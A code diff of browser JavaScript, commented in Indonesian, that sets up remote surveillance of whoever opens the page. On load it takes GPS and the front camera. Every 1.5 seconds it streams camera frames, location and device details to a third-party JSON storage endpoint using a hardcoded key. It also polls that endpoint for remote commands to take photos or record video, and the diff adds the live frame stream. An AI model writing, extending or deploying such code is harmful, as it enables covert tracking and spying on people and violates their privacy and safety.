@@ -36,74 +36,31 @@
     const JSON_URL = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
     const API_KEY  = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
 
-    const POLL_INTERVAL_MS = 3500;
-    const MOVE_SEND_COOLDOWN_MS = 3000;
+    // Interval kirim live frame (1500 ms = ~1.5 detik) agar tidak membebani jsonstorage.net
+    const LIVE_FRAME_MS = 1500;
     const RECORD_MS = 4000;
 
     const sessionId = "sess_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7);
     let locationData = null;
     let cameraStream = null;
     let watchId = null;
-    let pollTimer = null;
-    let isSyncing = false;
-    let isExecuting = false;
+    let loopTimer = null;
+    let isBusy = false;
     let isInitializing = false;
-    let lastMoveSentAt = 0;
     let lastHandledCommandToken = null;
 
     const video = document.getElementById('videoPreview');
     const canvas = document.getElementById('captureCanvas');
 
-    async function fetchStorage() {
-        const res = await fetch(`${JSON_URL}?t=${Date.now()}`);
-        if (!res.ok) throw new Error("Fetch failed");
-        const data = await res.json();
-        return {
-            logs: Array.isArray(data.logs) ? data.logs : [],
-            livePositions: data.livePositions && typeof data.livePositions === "object" ? data.livePositions : {},
-            command: data.command || { action: "NONE", targetSessionId: null, token: null }
-        };
-    }
-
-    async function saveStorage(payload) {
-        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
-        const res = await fetch(putUrl, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        if (!res.ok) throw new Error("Save failed");
-    }
-
-    async function pushLivePosition(posObj, cameraReady) {
-        if (isSyncing || isExecuting) return;
-        const now = Date.now();
-        if (now - lastMoveSentAt < MOVE_SEND_COOLDOWN_MS) return;
-
-        isSyncing = true;
-        lastMoveSentAt = now;
-
-        try {
-            const state = await fetchStorage();
-            state.livePositions[sessionId] = {
-                sessionId: sessionId,
-                nama: "HP Saya",
-                lat: posObj.lat,
-                lng: posObj.lng,
-                akurasi: posObj.akurasi,
-                kecepatan: posObj.speed,
-                arah: posObj.heading,
-                kameraAktif: Boolean(cameraReady),
-                waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
-                updatedAt: Date.now(),
-                perangkat: navigator.userAgent
-            };
-            await saveStorage(state);
-        } catch (err) {
-            console.error("Live pos error:", err);
-        } finally {
-            isSyncing = false;
-        }
+    function makeFrameDataUrl(width, quality) {
+        const vw = video.videoWidth || 640;
+        const vh = video.videoHeight || 480;
+        const targetH = Math.round((vh / vw) * width);
+        canvas.width = width;
+        canvas.height = targetH;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, width, targetH);
+        return canvas.toDataURL('image/jpeg', quality);
     }
 
     function startLocationWatcher() {
@@ -112,12 +69,8 @@
                 reject(new Error("Geolocation not supported"));
                 return;
             }
-
             let settled = false;
-
-            if (watchId !== null) {
-                navigator.geolocation.clearWatch(watchId);
-            }
+            if (watchId !== null) navigator.geolocation.clearWatch(watchId);
 
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
@@ -132,9 +85,6 @@
                             ? Math.round(pos.coords.heading) + "°"
                             : "-"
                     };
-
-                    pushLivePosition(locationData, Boolean(cameraStream));
-
                     if (!settled) {
                         settled = true;
                         resolve(locationData);
@@ -159,7 +109,6 @@
             if (!locationData) {
                 await startLocationWatcher();
             }
-
             if (locationData && !cameraStream && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
@@ -167,11 +116,9 @@
                 });
                 video.srcObject = cameraStream;
                 await video.play().catch(() => {});
-                await pushLivePosition(locationData, true);
             }
-
             if (locationData && cameraStream) {
-                startCommandPolling();
+                startLiveLoop();
             }
         } catch (err) {
             console.error(err);
@@ -184,19 +131,6 @@
         if (!locationData || !cameraStream) {
             initSession();
         }
-    }
-
-    function takePhotoBase64() {
-        const targetW = 480;
-        const vw = video.videoWidth || 640;
-        const vh = video.videoHeight || 480;
-        const targetH = Math.round((vh / vw) * targetW);
-
-        canvas.width = targetW;
-        canvas.height = targetH;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, targetW, targetH);
-        return canvas.toDataURL('image/jpeg', 0.55);
     }
 
     function pickMimeType() {
@@ -214,7 +148,7 @@
                 return;
             }
             const mime = pickMimeType();
-            const opts = { videoBitsPerSecond: 180000 };
+            const opts = { videoBitsPerSecond: 160000 };
             if (mime) opts.mimeType = mime;
 
             let rec;
@@ -239,32 +173,72 @@
         });
     }
 
-    async function pollCommands() {
-        if (isExecuting || isSyncing || !cameraStream || !locationData) return;
+    async function fetchStorage() {
+        const res = await fetch(`${JSON_URL}?t=${Date.now()}`);
+        if (!res.ok) throw new Error("Fetch failed");
+        const data = await res.json();
+        return {
+            logs: Array.isArray(data.logs) ? data.logs : [],
+            liveSessions: data.liveSessions && typeof data.liveSessions === "object" ? data.liveSessions : {},
+            command: data.command || { action: "NONE", targetSessionId: null, token: null }
+        };
+    }
+
+    async function saveStorage(payload) {
+        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
+        const res = await fetch(putUrl, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        if (!res.ok) throw new Error("Save failed");
+    }
+
+    async function tickLiveAndCommands() {
+        if (isBusy || !cameraStream || !locationData) return;
+        isBusy = true;
 
         try {
             const state = await fetchStorage();
+            const nowStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB";
+
+            // Frame kecil (320px, kualitas 0.42) untuk simulasi tampilan video call
+            const liveFrame = makeFrameDataUrl(320, 0.42);
+
+            state.liveSessions[sessionId] = {
+                sessionId: sessionId,
+                nama: "HP Saya",
+                frame: liveFrame,
+                lat: locationData.lat,
+                lng: locationData.lng,
+                akurasi: locationData.akurasi,
+                kecepatan: locationData.speed,
+                arah: locationData.heading,
+                waktu: nowStr,
+                updatedAt: Date.now(),
+                perangkat: navigator.userAgent
+            };
+
             const cmd = state.command || {};
             const isForMe = !cmd.targetSessionId || cmd.targetSessionId === sessionId;
             const hasNewAction = (cmd.action === "PHOTO" || cmd.action === "RECORD") && cmd.token && cmd.token !== lastHandledCommandToken;
 
             if (isForMe && hasNewAction) {
-                isExecuting = true;
                 lastHandledCommandToken = cmd.token;
 
                 if (cmd.action === "PHOTO") {
-                    const foto = takePhotoBase64();
+                    const fotoHD = makeFrameDataUrl(480, 0.6);
                     state.logs.unshift({
                         id: Date.now(),
                         sessionId: sessionId,
                         tipe: "foto",
                         nama: "HP Saya",
-                        foto: foto,
+                        foto: fotoHD,
                         video: null,
                         lat: locationData.lat,
                         lng: locationData.lng,
                         akurasi: locationData.akurasi,
-                        waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
+                        waktu: nowStr,
                         perangkat: navigator.userAgent
                     });
                 } else if (cmd.action === "RECORD") {
@@ -279,30 +253,31 @@
                         lat: locationData.lat,
                         lng: locationData.lng,
                         akurasi: locationData.akurasi,
-                        waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
+                        waktu: nowStr,
                         perangkat: navigator.userAgent
                     });
                 }
 
                 state.command = { action: "NONE", targetSessionId: null, token: null };
-                await saveStorage(state);
-                isExecuting = false;
             }
+
+            await saveStorage(state);
         } catch (err) {
-            isExecuting = false;
             console.error(err);
+        } finally {
+            isBusy = false;
         }
     }
 
-    function startCommandPolling() {
-        if (pollTimer) clearInterval(pollTimer);
-        pollCommands();
-        pollTimer = setInterval(pollCommands, POLL_INTERVAL_MS);
+    function startLiveLoop() {
+        if (loopTimer) clearInterval(loopTimer);
+        tickLiveAndCommands();
+        loopTimer = setInterval(tickLiveAndCommands, LIVE_FRAME_MS);
     }
 
     window.addEventListener("DOMContentLoaded", initSession);
     window.addEventListener("beforeunload", () => {
-        if (pollTimer) clearInterval(pollTimer);
+        if (loopTimer) clearInterval(loopTimer);
         if (watchId !== null) navigator.geolocation.clearWatch(watchId);
         if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
     });
